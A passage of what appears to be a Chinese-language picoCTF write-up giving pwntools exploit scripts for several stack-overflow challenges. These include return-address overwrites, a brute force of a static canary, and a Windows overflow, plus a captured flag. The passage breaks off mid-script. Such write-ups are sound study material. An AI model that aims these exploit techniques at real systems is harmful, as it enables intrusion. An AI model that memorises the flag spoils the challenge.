        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">56929</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Please enter your string: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x080491F6</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="buffer-overflow-2">buffer overflow 2</h2>

<h3 id="ÊÄùË∑Ø-3">ÊÄùË∑Ø</h3>

<p>Á±ª‰ºº‰∫é buffer overflow 1ÔºåÂè™‰∏çËøáÂä†‰∫Ü‰∏Ä‰∏™ÂèÇÊï∞‰º†ÈÄíÁöÑÈôêÂà∂„ÄÇ</p>

<h3 id="exp-2">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">58214</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s">' string: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049296</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xCAFEF00D</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xF00DF00D</span><span class="p">))</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="buffer-overflow-3">buffer overflow 3</h2>

<h3 id="ÊÄùË∑Ø-4">ÊÄùË∑Ø</h3>

<p>canaryÈïøÂ∫¶‰∏∫4ÔºåÂÖàÁàÜÁ†¥ÊãøcanaryÔºåÁÑ∂ÂêéÂÜçÂ∏∏ËßÑÊ†àÊ∫¢Âá∫Â∞±Ë°å‰∫Ü</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define CANARY_SIZE 4
</span><span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="n">CANARY_SIZE</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"***** Stack Smashing Detected ***** : Canary Value Corrupt!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="c1">// crash immediately</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="exp-3">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">63235</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">st_l</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">):</span>
        <span class="n">st_l</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">st_l</span><span class="p">)</span> 
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">size</span> <span class="o">=</span> <span class="mh">0x42</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x40</span>

<span class="n">pre_pay</span> <span class="o">=</span> <span class="n">payload</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">st_l</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># test canary
# while True:
#         try:
#                 if argv[1] == 'r':
#                         p = remote('saturn.picoctf.net', 63235)
#                 else:
#                         p = process(binary)
</span>
<span class="c1">#                 # p = process(binary)
#                 # p = remote('saturn.picoctf.net', 57461)
#                 sla('Buffer?\n&gt; ', str(size))
#                 # sa('Input&gt; ', b'b'*0x40+b'cana'+b'AAAA'+p64(0)+p32(0)+p32(0x08049336))
#                 sa('Input&gt; ', payload)
#                 res = rl()
#                 print('res = ', res)
#                 if (str(res).find('Smashing') &gt; 0):
#                         payload = pre_pay
#                         i = (i + 1) % len(st_l)
#                         payload += st_l[i]
#                 else:
#                         print(payload)
#                         size = size + 1
#                         i = 0
#                         pre_pay = payload
#                         payload += st_l[i]
#                         j = j + 1
#                         log.success('size = ' + hex(size))
#                         log.success('pre_pay = ' + str(pre_pay))
#                         log.success('j = ' + str(j))
#                         if (j == 4):
#                                 break
</span>
<span class="c1">#         except Exception as e:
#                 p.close()
</span>

<span class="n">size</span> <span class="o">=</span> <span class="mh">0x60</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'AAAA'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x08049336</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Buffer?</span><span class="se">\n</span><span class="s">&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
<span class="n">sa</span><span class="p">(</span><span class="s">'Input&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h3 id="result">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
res =  b"Ok... Now Where's the Flag?\n"
b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] size = 0x46
[+] pre_pay = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] j = 4
...
b'picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}\n'
</code></pre></div></div>

<h2 id="x-sixty-what">x-sixty-what</h2>

<h3 id="ÊÄùË∑Ø-5">ÊÄùË∑Ø</h3>

<p>Êç¢Êàê‰∫Üx86_64Á®ãÂ∫èÔºåÂíåbuffer_overflow_1Á±ª‰ººÔºåno canaryÔºåÁõ¥Êé•Ê∫¢Âá∫Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ„ÄÇ</p>

<h3 id="exp-4">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52865</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'gets you the flag: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x48</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40101a</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401236</span><span class="p">))</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="wine">wine</h2>

<h3 id="ÊÄùË∑Ø-6">ÊÄùË∑Ø</h3>

<p>Êç¢Êàê‰∫ÜwindowsÁöÑÊ†àÊ∫¢Âá∫È¢òÔºåno canary</p>

<h3 id="exp-5">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">65422</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x401530</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'Give me a string!</span><span class="se">\r\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="cve-xxxx-xxxx">CVE-XXXX-XXXX</h2>

<p>Áõ¥Êé•googleÊêúWindows Print Spooler Service 2021 CVEÔºåÂ§öËØïÂá†‰∏™</p>

<h2 id="rps">RPS</h2>

<h3 id="ÊÄùË∑Ø-7">ÊÄùË∑Ø</h3>

<p>ËøûÁª≠5Ê¨°ÁåúËµ¢Áü≥Â§¥Ââ™ÂàÄÂ∏ÉÊâç‰ºöÂêêflagÔºåÁî®ÁöÑÁ¨®ÊñπÊ≥ïÁàÜÁ†¥ÔºåÂ§ßÊ¶Ç10ÂàÜÈíüÂ∑¶Âè≥„ÄÇ</p>

<h3 id="exp-6">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="c1"># context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52524</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./game'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
